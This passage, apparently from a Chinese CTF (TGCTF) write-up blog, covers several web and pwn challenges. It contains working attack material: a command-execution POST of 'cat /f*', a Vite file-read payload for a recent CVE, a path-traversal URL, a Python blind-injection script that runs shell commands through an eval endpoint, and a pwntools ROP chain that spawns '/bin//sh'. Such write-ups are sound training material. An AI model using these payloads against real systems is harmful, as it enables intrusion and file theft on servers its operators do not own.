filename=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\n111\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B--\n<span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/class.php?filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32439</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">11</span></span>\n\nwow=cat /f*</code></pre>\n\n<h3 id=\"前端GAME\"><a href=\"#前端GAME\" class=\"headerlink\" title=\"前端GAME\"></a>前端GAME</h3><p>紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。</p>\n<p>这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&amp;raw??即可</p>\n<pre class=\"language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32360&#x2F;@fs&#x2F;tgflagggg?import&amp;raw??</code></pre>\n\n<h3 id=\"前端GAME-plus\"><a href=\"#前端GAME-plus\" class=\"headerlink\" title=\"前端GAME plus\"></a>前端GAME plus</h3><p>参考<a href=\"https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC\">https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC</a></p>\n<pre class=\"language-none\"><code class=\"language-none\">&#x2F;@fs&#x2F;tgflagggg?import&amp;?meteorkai.svg?.wasm?init</code></pre>\n\n<h3 id=\"火眼辩魑魅\"><a href=\"#火眼辩魑魅\" class=\"headerlink\" title=\"火眼辩魑魅\"></a>火眼辩魑魅</h3><p>robots.txt 直接打 tgshell.php</p>\n<p>无过滤，直接POST传cat &#x2F;f*一把梭了</p>\n<h3 id=\"熟悉的配方，熟悉的味道\"><a href=\"#熟悉的配方，熟悉的味道\" class=\"headerlink\" title=\"熟悉的配方，熟悉的味道\"></a>熟悉的配方，熟悉的味道</h3><p>狠狠非预期！！！</p>\n<p>直接打盲注好吧。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://node1.tgctf.woooo.tech:30215\"</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">\"TGCTF&#123;028b2d11-2783-464c-8cea-fda040\"</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># for s in 'TGCTF&#123;':</span>\n    <span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token operator\">+</span><span class=\"token string\">'&#125;'</span><span class=\"token operator\">+</span><span class=\"token string\">'&#123;'</span><span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>ascii_lowercase<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"expr\"</span><span class=\"token punctuation\">:</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'));1/a\"</span></span><span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\"># res = requests.post(url, data=json)</span>\n        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(res.text, s)</span>\n        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>text <span class=\"token operator\">!=</span> <span class=\"token string\">\"A server error occurred.  Please contact the administrator.\"</span><span class=\"token punctuation\">:</span>\n            flag <span class=\"token operator\">+=</span> s\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></code></pre>\n\n<p>只要flag逐位是对的上的就会触发1&#x2F;0进而报错。否则就是1&#x2F;1正常。布尔盲注打完了。</p>\n<h3 id=\"直面天命\"><a href=\"#直面天命\" class=\"headerlink\" title=\"直面天命\"></a>直面天命</h3><p>&#x2F;hints发现有路由。爆破。打到&#x2F;aazz。可以传参。那就arjun扫。发现filename参数。</p>\n<p>路径穿越出。</p>\n<p><a href=\"http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag\">http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag</a></p>\n<h3 id=\"TG-wordpress\"><a href=\"#TG-wordpress\" class=\"headerlink\" title=\"TG_wordpress\"></a>TG_wordpress</h3><p>&#x2F;robots.txt进去。看到&#x2F;.tmp&#x2F;vuln和&#x2F;.tmp&#x2F;.bak。.bak发现服务器在52013开了vuln服务（nc可以连）</p>\n<p>ret2syscall 直接ROPgadgets可以一把梭。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./gets\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#io=remote()</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\np <span class=\"token operator\">=</span> <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">40</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000409f9e</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rsi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000419484</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rax ; ret</span>\np <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin//sh'</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000044a5e5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov qword ptr [rsi], rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000409f9e</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rsi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000043d350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor rax, rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000044a5e5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov qword ptr [rsi], rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000401f2f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rdi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000409f9e</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rsi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000047f2eb</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rdx ; pop rbx ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4141414141414141</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># padding</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000043d350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor rax, rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span 